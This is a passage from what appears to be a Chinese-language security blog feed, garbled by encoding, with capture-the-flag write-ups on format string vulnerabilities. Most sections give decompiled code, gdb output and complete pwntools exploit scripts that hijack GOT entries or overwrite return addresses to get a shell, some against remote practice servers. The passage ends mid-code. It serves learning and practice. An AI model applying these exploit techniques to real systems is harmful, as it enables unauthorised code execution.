æ•°æ®è¿‡å»åï¼Œä¸€å®šè¦æ¥æ”¶ä¸€ä¸‹ï¼Œå¹¶ä¸”å†ä¸€æ¬¡çš„æ•°æ®è¯»å…¥è¦é˜²æ­¢bssä¸Šçš„ç¼“å†²åŒºé‡Œé¢å‚æ‚æ•°æ®çš„å½±å“ã€‚</li></ul><h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><p>é€šè¿‡è¿™ä¸¤ä¸ªä¾‹é¢˜è¯´æ˜ï¼Œé¢å¯¹fmtçš„bufä¸åœ¨æ ˆä¸Šæ—¶ï¼Œå½’æ ¹ç»“åº•ä¹Ÿå°±æ˜¯ä¸€å®šè¦å­¦ä¼š<strong>çµæ´»ã€å……åˆ†çš„åˆ©ç”¨æ ˆä¸Šçš„æ•°æ®</strong>,å•çº¯çš„ebpé“¾åªæ˜¯é€‚åˆç®€å•çš„æƒ…å†µã€‚</p><p>ä½†æ˜¯ä¹Ÿæ˜¯åšé¢˜æ—¶ï¼Œä¹Ÿæ˜¯ä¸€å®šè¦ä¼˜å…ˆè€ƒè™‘ebpé“¾æ˜¯å¦èƒ½åˆ©ç”¨ï¼Œå› ä¸ºebpé“¾æ„æˆçš„è¯ï¼Œå®ƒçš„ç›¸å¯¹åç§»å°±æ˜¯<strong>é’ˆå¯¹æ€§ç¨‹åºæœ¬èº«çš„</strong>ï¼ŒåŸºæœ¬ä¸ä¼šå—åˆ°libcç‰ˆæœ¬çš„å½±å“ï¼Œç”¨èµ·æ¥å¾ˆå¥½ç”¨ï¼Œè¦ä¼˜å…ˆè€ƒè™‘ã€‚</p><p>è¿˜æœ‰å°±æ˜¯é¢å¯¹è¿™ç§ä¼š<strong>æœ‰éšæœºæ ˆæƒ…å†µã€æ²¡æœ‰ebpé“¾</strong>çš„é¢˜ç›®ï¼Œä¸€å®šè¦æ³¨æ„æœ¬åœ°å’Œè¿œç¨‹çš„libcç‰ˆæœ¬ã€æ³¨æ„ç¯å¢ƒ,å› ä¸ºè¿™äº›ä¸ä¸€æ ·å¯¼è‡´æ ˆçš„æƒ…å†µä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯¼è‡´expä¹Ÿè¦æœ‰ç›¸åº”çš„å˜åŒ–ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>å­¦ä¹ è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ </title>
    <link href="/2020/03/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/03/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ "><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ " class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ "></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ </h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ•´åˆä¸€ä¸‹æœ€è¿‘åšçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ç›®çš„ç»ƒä¹ ï¼ŒæŠŠwpç»™å†™ä¸€ä¸‹ï¼Œæ–¹ä¾¿å¯¹æ€»ç»“å¯¹è¿™ä¸ªæ¼æ´çš„åˆ©ç”¨å¥—è·¯å’ŒæŠ€å·§ã€‚</p><h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a>inndy_echo</h2><h3 id="ä¿æŠ¤å’Œarch"><a href="#ä¿æŠ¤å’Œarch" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo/echo&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  char s; // [esp+Ch] [ebp-10Ch]  unsigned int v4; // [esp+10Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>å¯ä»¥çœ‹åˆ°ä¼šæ— é™çš„æ‰“å°ä½ è¾“å…¥çš„ä¸œè¥¿ï¼Œå¹¶ä¸”æœ‰systemè¿™ä¸ªå‡½æ•°ï¼Œåˆ©ç”¨æ€è·¯ä¹Ÿå°±æ˜¯GOT hijackï¼ŒæŠŠprintfå‡½æ•°çš„gotæ”¹ä¸ºsystemçš„pltï¼Œæ³¨æ„è¦å•æ¬¡printfå¤šæ¬¡å†™å…¥ï¼Œæ”¹ä¸ºsystemçš„pltåï¼Œå†ä¼ è¿‡å»<code>/bin/sh</code>ï¼Œæ­¤æ—¶å°±ä¼šå˜æˆ<code>system(/bin/sh)</code></p><h3 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h3><pre><code>gdb-peda$ stack 0x200000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)0004| 0xffffd254 --&gt; 0x1000008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b0012| 0xffffd25c --&gt; 0x00016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f400020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)0024| 0xffffd268 --&gt; 0xf63d4e2e0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code class="c">gdb-peda$ fmtarg 0xffffd26cThe index of format argument : 7 (&quot;\%6$p&quot;)</code></pre><p>ç¡®å®šåç§»æ˜¯7ï¼Œæ‰“ç®—ä¸€ä¼šå†™payloadæ—¶å€™éœ€è¦è¡¥é½ï¼Œå°±<code>.ljust</code>è¡¥æˆ0x20çš„ï¼Œä¹Ÿå°±æ˜¯<code>offset = 7 + 0x20/4 = 15</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = 0x08048400for i in range(2):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>æ¢ä¸€ç§å°±æ˜¯ç”¨pwntoolsæ¨¡å—ï¼Œé¢å¯¹32ä½ï¼Œè¿™ç§æƒ…å†µè¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼š</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010payload = fmtstr_payload(7,{printf_got : system_plt})io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><pre><code class="c">[DEBUG] Sent 0x3c bytes:    00000000  10 a0 04 08  11 a0 04 08  12 a0 04 08  13 a0 04 08  â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚Â·Â·Â·Â·â”‚    00000010  25 32 34 30  63 25 37 24  68 68 6e 25  31 33 32 63  â”‚%240â”‚c%7$â”‚hhn%â”‚132câ”‚    00000020  25 38 24 68  68 6e 25 31  32 38 63 25  39 24 68 68  â”‚%8$hâ”‚hn%1â”‚28c%â”‚9$hhâ”‚    00000030  6e 25 34 63  25 31 30 24  68 68 6e 0a               â”‚n%4câ”‚%10$â”‚hhnÂ·â”‚â”‚    0000003c</code></pre><p>å¯ä»¥çœ‹ä¸€ä¸‹å…¶ç”Ÿæˆçš„payloadï¼ŒæŠŠç›®æ ‡åœ°å€ä¿¡æ¯æ”¾åœ¨å¼€å¤´ï¼Œåœ¨64ä½æ˜¯è‚¯å®šæ˜¯ä¸å¯è¡Œçš„ã€‚</p><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><h3 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char buf; // [esp+2Ch] [ebp-5Ch]  unsigned int v5; // [esp+7Ch] [ebp-Ch]  v5 = __readgsdword(0x14u);  be_nice_to_people();  memset(&amp;buf, 0, 0x50u);  read(0, &amp;buf, 0x50u);  printf(&amp;buf);  printf(&quot;%d!\n&quot;, *(_DWORD *)&amp;x);  if ( *(_DWORD *)&amp;x != 4 )    return 0;  puts(&quot;running sh...&quot;);  system(&quot;/bin/sh&quot;);  return 0;}</code></pre><p>ååˆ†ç®€å•çš„é¢˜ç›®ï¼Œæ£€éªŒ x å€¼æ˜¯å¦ä¸º4ï¼Œå¦‚æœæ˜¯4ï¼ˆæ•°å­—ï¼‰ï¼Œå°±ç›´æ¥ç»™ä½ shelläº†ã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;# io = process(&#39;./fm&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26915)# io.recv()payload = p32(0x0804A02C) + &#39;%11$hn&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="winesap-week6"><a href="#winesap-week6" class="headerlink" title="winesap_week6"></a>winesap_week6</h2><h3 id="æºç ï¼š"><a href="#æºç ï¼š" class="headerlink" title="æºç ï¼š"></a>æºç ï¼š</h3><pre><code class="c">#include &lt;stdio.h&gt;int main() {    setvbuf(stdout, 0, _IONBF, 0);    alarm(180);    char str[100];    while(gets(str)) {        printf(str);    }    return 0;}</code></pre><p>éœ€è¦ç¼–è¯‘ä¸º64ä½ï¼Œè¿™ä¸ªé¢˜æ¯”èµ·æ¥ç¬¬ä¸€ä¸ªä¹Ÿå°±æ˜¯æ²¡æœ‰äº†systemå‡½æ•°ï¼Œéœ€è¦è‡ªå·±æ³„æ¼ä¸€ä¸‹libcçš„baseï¼Œç®—å‡ºsystemåœ°å€ï¼Œç„¶åè¿˜æ˜¯GOT hijackå°±å¯ä»¥äº†ã€‚</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">from pwn import *import timecontext.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./fmt1&#39;)elf = ELF(&#39;./fmt1&#39;)libc = elf.libcprintf_got = 0x0000601020io.sendline(&#39;%21$p&#39;)io.recvuntil(&#39;0x&#39;)libc_base = int((io.recv(12)),16) - 240 -libc.symbols[&#39;__libc_start_main&#39;]system_addr = libc_base + libc.symbols[&#39;system&#39;]print(&#39;leak_libc_base: &#39; + hex(libc_base))print(&#39;system_addr: &#39; + hex(system_addr))def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = system_addrfor i in range(3):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,12+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x30,&#39;a&#39;) + p64(printf_got) +p64(printf_got+2) + p64(printf_got+4)io.sendline(payload)sleep(1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h2 id="HITCON-Training-lab8"><a href="#HITCON-Training-lab8" class="headerlink" title="HITCON-Training-lab8"></a>HITCON-Training-lab8</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><pre><code class="c">#include &lt;stdio.h&gt;int magic = 0 ;int main(){    char buf[0x100];    setvbuf(stdout,0,2,0);    puts(&quot;Please crax me !&quot;);    printf(&quot;Give me magic :&quot;);    read(0,buf,0x100);    printf(buf);    if(magic == 0xda){        system(&quot;cat /home/craxme/flag&quot;);    }else if(magic == 0xfaceb00c){        system(&quot;cat /home/craxme/craxflag&quot;);    }else{        puts(&quot;You need be a phd&quot;);    }}</code></pre><p>ç¼–è¯‘ä¸º64ä½ã€‚</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ï¼ˆè¿™ä¸ªé¢˜ç›®æ˜¯çº¯ç²¹å°±æ˜¯ä¸ºäº†ç»ƒä¹ ä»»æ„åœ°å€å†™å…¥çš„ï¼Œæˆ‘è¿™é‡Œå°±ç›´æ¥å†™expæ‹¿sheeläº†ã€‚ï¼‰å¯ä»¥çœ‹åˆ°å½“å†ä¸€æ¬¡printfï¼Œä¹‹åç¨‹åºä¾¿åœæ­¢äº†ï¼Œä¸”ç»“æŸå‰æœ‰putså‡½æ•°ã€‚<br>æ€è·¯å°±æ˜¯å¯ä»¥GOT hijack putå‡½æ•°çš„GOTä¸ºreadå‡½æ•°å“ªé‡Œï¼Œè®©å…¶call putså‡½æ•°æ—¶è¿”å›åˆ°readå‡½æ•°ï¼Œå¹¶ä¸”åœ¨è¿™æ¬¡printfå‡½æ•°æ¼æ´åˆ©ç”¨æ—¶ï¼Œä¹ŸæŠŠprintfå‡½æ•°çš„GOTæ”¹ä¸ºsystemçš„pltï¼Œç„¶åä¼ å…¥<code>/bin/sh</code>å³å¯ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./craxme&#39;)# io = remote(&#39;127.0.0.1&#39;,8888)magic = 0x0000060106Cio.recvuntil(&#39;:&#39;)system_plt = 0x04005A0puts_got = 0x0601018ret_addr = 0x00400747printf_got = 0x00601030key = 0x00400747key2 = 0x04005A0def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;for i in range(3):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,26+i)     prev = (key &gt;&gt; i*16) &amp; 0xfffffor i in range(3):    payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,29+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x80+0x20,&#39;a&#39;) + flat([puts_got,puts_got+2,puts_got+4,printf_got,printf_got+2,printf_got+4])io.sendline(payload)io.interactive()</code></pre><h2 id="cacti-pwn3"><a href="#cacti-pwn3" class="headerlink" title="cacti-pwn3"></a>cacti-pwn3</h2><h3 id="ä¿æŠ¤å’Œarch-1"><a href="#ä¿æŠ¤å’Œarch-1" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/cctf/pwn3&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>è¿™ä¸ªé¢˜æ¨¡æ‹Ÿäº†ä¸€ä¸ªftpæœåŠ¡ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/DH8PyF.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œæ§åˆ¶çš„æ˜¯ç™»é™†ã€‚è¿›å…¥åˆ†æä¸€ä¸‹ï¼š</p><pre><code class="c">char *__cdecl ask_username(char *dest){  char src[40]; // [esp+14h] [ebp-34h]  int i; // [esp+3Ch] [ebp-Ch]  puts(&quot;Connected to ftp.hacker.server&quot;);  puts(&quot;220 Serv-U FTP Server v6.4 for WinSock ready...&quot;);  printf(&quot;Name (ftp.hacker.server:Rainism):&quot;);  __isoc99_scanf(&quot;%40s&quot;, src);  for ( i = 0; i &lt;= 39 &amp;&amp; src[i]; ++i )    ++src[i];  return strcpy(dest, src);}</code></pre><p>ç”¨æˆ·åå‡½æ•°ï¼Œå‘ç°å¯¹ä½ è¾“å…¥çš„ä¸œè¥¿è¿›è¡Œè¯¸ä½çš„è¿›è¡ŒåŠ ä¸€ã€‚</p><pre><code class="c">int __cdecl ask_password(char *s1){  if ( !strcmp(s1, &quot;sysbdmin&quot;) )    return puts(&quot;welcome!&quot;);  puts(&quot;who you are?&quot;);  exit(1);  return puts(&quot;welcome!&quot;);}</code></pre><p>ç”¨æˆ·å¯†ç å‡½æ•°ï¼Œå‘ç°è¦è·Ÿ<code>sysbdmin</code> è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœä¸ç›¸ç­‰ï¼Œå°±ç›´æ¥é€€å‡ºã€‚<br>(strcmpå‡½æ•°å¯¹æ¯”ä¸¤ä¸ªå­—ç¬¦ä¸²æ—¶ï¼Œç›¸ç­‰è¿”å›0ï¼Œ!0 = éå‡ = çœŸï¼‰<br>æ‰€ä»¥è¿™ä¸ªç»•è¿‡å°±æ—¶sysbdmin è¯¸ä½å‡1å³å¯ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/tBKwyW.png" srcset="/img/loading.gif" alt><br>å‰©ä¸‹çš„å°±æ˜¯è¾“å…¥<code>get put dir</code>,ä¼šè¿›å…¥ä¸åŒçš„åˆ†æ”¯ï¼Œå…¶ä¸­è¾“å…¥getå‡½æ•°ï¼š</p><pre><code class="c">int get_file(){  char dest; // [esp+1Ch] [ebp-FCh]  char s1; // [esp+E4h] [ebp-34h]  char *i; // [esp+10Ch] [ebp-Ch]  printf(&quot;enter the file name you want to get:&quot;);  __isoc99_scanf(&quot;%40s&quot;, &amp;s1);  if ( !strncmp(&amp;s1, &quot;flag&quot;, 4u) )    puts(&quot;too young, too simple&quot;);  for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) )  {    if ( !strcmp(i, &amp;s1) )    {      strcpy(&amp;dest, i + 40);      return printf(&amp;dest);    }  }  return printf(&amp;dest);}</code></pre><p>è¿™ä¸ªå‡½æ•°æ˜¯æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„ï¼Œå½“ä½ putä¸Šå»ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒä¼šè®©ä½ è¾“å…¥æ–‡ä»¶åå­—å’Œæ–‡ä»¶å†…å®¹ï¼Œç„¶ågetè¿™ä¸ªå‡½æ•°ä¼šæ ¹æ®æ–‡ä»¶åå­—ï¼Œæ¥è¾“å‡ºå…¶å†…å®¹ï¼Œåˆ©ç”¨è¿™ä¸¤ä¸ªå‡½æ•°æ­é…ä¸€ä¸‹å°±å¯ä»¥å®ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨äº†ã€‚å¹¶ä¸”åœ¨dirä¸­ï¼Œå…¶ä¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶çš„åå­—ï¼Œç”¨çš„æ˜¯putså‡½æ•°ã€‚ç„¶åå°±æœ‰æ€è·¯åˆ©ç”¨äº†ï¼š</p><ul><li>ç”±äºæ²¡æœ‰systemå‡½æ•°ï¼Œç„¶åå°±éœ€è¦æƒ³åŠæ³•æ³„æ¼ä¸€ä¸‹libcåœ°å€ï¼Œæ¥ç®—å‡ºsystemçš„å‡½æ•°åœ¨libcçš„åœ°å€ã€‚</li><li>ä¿®æ”¹putså‡½æ•°çš„gotä¸ºsystemçš„åœ°å€ï¼Œç„¶åè®°å¾—è¿™ä¸ªæ–‡ä»¶çš„åç§°æ˜¯<code>/bin/sh</code>,è¿™æ ·åœ¨ä½¿ç”¨dirè°ƒç”¨putså‡½æ•°æ—¶ï¼Œå°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚<br>è¿™é¢˜æ¯”è¾ƒæœ‰è¶£ï¼Œæœ‰ç‚¹éš¾åœ¨åˆ†æè¿™ä¸ªç¨‹åºåœ¨å¹²å˜›ï¼Œåˆ©ç”¨æ€è·¯å€’æ˜¯ä¸éš¾ã€‚</li></ul><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./pwn3&#39;)elf = ELF(&#39;./pwn3&#39;)libc = elf.libcs = &#39;sysbdmin&#39;key = &#39;&#39;for i in s:    key+=chr(ord(i)-1)print(key)io.sendline(key)info(&#39;---------leak libc_base--------&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;put&#39;)io.recvuntil(&#39;upload:&#39;)io.sendline(&#39;1111&#39;)puts_got = elf.got[&#39;puts&#39;]io.sendline(&#39;%8$s&#39; + p32(puts_got) )io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;get&#39;)io.recvuntil(&#39;get:&#39;)io.sendline(&#39;1111&#39;)puts_addr = u32(io.recv(4)[:4])print(&#39;puts_add:&#39; + hex(puts_addr))sys_addr = puts_addr - libc.symbols[&#39;puts&#39;] + libc.symbols[&#39;system&#39;]io.recvuntil(&#39;&gt;&#39;)info(&#39;---------hijack puts_got--------&#39;)io.sendline(&#39;put&#39;)io.recvuntil(&#39;upload:&#39;)io.sendline(&#39;/bin/sh;&#39;)payload = fmtstr_payload(7,{puts_got: sys_addr})io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;get&#39;)io.recvuntil(&#39;get:&#39;)info(&#39;--------- get shell-------&#39;)io.sendline(&#39;/bin/sh;&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;dir&#39;)io.interactive()</code></pre><h2 id="ä¸‰ä¸ªç™½å¸½-pwnme-k0"><a href="#ä¸‰ä¸ªç™½å¸½-pwnme-k0" class="headerlink" title="ä¸‰ä¸ªç™½å¸½ - pwnme_k0"></a>ä¸‰ä¸ªç™½å¸½ - pwnme_k0</h2><h3 id="ä¿æŠ¤å’Œarch-2"><a href="#ä¿æŠ¤å’Œarch-2" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/ctf_wiki/fmt/sgbm_pwnme/pwnme_k0&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>å¼€å¯äº†RELROï¼Œè¿™æ ·å°±æ— æ³•ä¿®æ”¹gotäº†ã€‚</p><h3 id="idaåˆ†æ-3"><a href="#idaåˆ†æ-3" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>ç¨‹åºå®ç°äº†ä¸€ä¸ªæ³¨å†Œç”¨æˆ·çš„åŠŸèƒ½ï¼Œæ³¨å†Œå¥½åå¯ä»¥æ¥å±•ç¤ºç”¨æˆ·ä¿¡æ¯ï¼Œä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œå’Œé€€å‡ºã€‚å…¶ä¸­åœ¨å±•ç¤ºç”¨æˆ·ä¿¡æ¯å½“ä¸­ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š</p><pre><code class="c">int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9){  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);  return printf(&amp;a9 + 4);}</code></pre><p>å…¶ä¸­å‘ç°å…¶è¾“å‡ºçš„bufå°±æ˜¯ä½ è¾“å…¥çš„å¯†ç ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt><br>å¹¶ä¸”è¿˜å‘ç°å…¶ä¸­æœ‰ä¸ªåé—¨å‡½æ•°ï¼Œä¼šè°ƒç”¨systemå‡½æ•°ç»™ä½ shellï¼Œå°±å¯ä»¥å»ä¿®æ”¹ç¨‹åºçš„è¿”å›åœ°å€ï¼Œç›´æ¥è¿”å›åˆ°è¿™é‡Œå°±æ‹¿åˆ°shelläº†ã€‚<br>Gdbè°ƒè¯•å®šä½å…³é”®åœ¨è¿™ä¸ªprintfå½“ä¸­ï¼Œç¡®å®šä¸€ä¸‹ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt></p><p>çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µï¼Œè¾“å…¥çš„usenameå¯ä»¥ç¡®å®šåç§»æ˜¯8ï¼Œrdiä¹Ÿæ˜¯æŒ‡å‘äº†å­˜æ”¾passwordçš„åœ°å€ã€‚å¹¶ä¸”å‘ç°æ ˆä¸Šä¹Ÿæœ‰å¾ˆå¤šæ ˆçš„åœ°å€ä¿¡æ¯ï¼Œå½“ç¬¬äºŒæ¬¡è¿è¡Œåˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œè¿™é‡Œespå¯¹åº”çš„åœ°å€ä¿¡æ¯ä¹Ÿæ˜¯ä¸ä¼šå˜çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥é€šè¿‡æ³„æ¼è¿™é‡Œçš„å€¼æ¥ç®—å‡ºret addressï¼Œç„¶åä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ä¸‹æŠŠret addressçš„pointæ”¾åˆ°æ ˆä¸Šï¼Œæ¥ç€å°±å¼€å§‹ä¿®æ”¹ret addressçš„å€¼äº†ã€‚</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./pwnme_k0&#39;)# context.clear(arch = &#39;amd64&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;%0006$lx&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;11111111&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)# io.recvuntil(&#39;Welc0me to sangebaimao!\n&#39;)stack = int(io.recvline_contains(&#39;7f&#39;),16)print(stack)ret_add = stack - 0x38# system_add = 0x04008AApayload = &#39;%2218c%8$hn&#39;io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;2&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(p64(ret_add))io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.interactive()</code></pre><h2 id="inndy-echo2"><a href="#inndy-echo2" class="headerlink" title="inndy-echo2"></a>inndy-echo2</h2><h3 id="ä¿æŠ¤å’Œarch-3"><a href="#ä¿æŠ¤å’Œarch-3" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code class="python">[*] &#39;/media/psf/mypwn2/buuctf/inndy_echo2/echo2&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled</code></pre><p>å¯ä»¥çœ‹åˆ°å¼€å¯äº†pieï¼Œè¿™æ—¶å€™å°±éœ€è¦æ¥æ³„æ¼ä¸€ä¸‹pieçš„åŸºåœ°å€ã€‚</p><h3 id="idaåˆ†æ-4"><a href="#idaåˆ†æ-4" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">void __noreturn echo(){  char s; // [rsp+0h] [rbp-110h]  unsigned __int64 v1; // [rsp+108h] [rbp-8h]  v1 